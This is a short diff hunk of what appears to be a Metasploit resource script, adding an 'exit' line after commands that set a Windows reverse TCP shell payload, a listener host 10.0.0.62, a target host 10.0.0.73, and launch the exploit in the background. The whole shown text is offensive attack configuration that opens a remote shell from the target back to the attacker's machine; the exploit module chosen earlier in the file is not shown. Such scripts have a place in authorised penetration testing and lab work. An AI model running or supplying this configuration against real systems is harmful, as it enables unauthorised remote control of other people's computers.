@@ -3,3 +3,4 @@ set payload windows/shell_reverse_tcp
 set LHOST 10.0.0.62
 set RHOST 10.0.0.73
 exploit -z
+exit
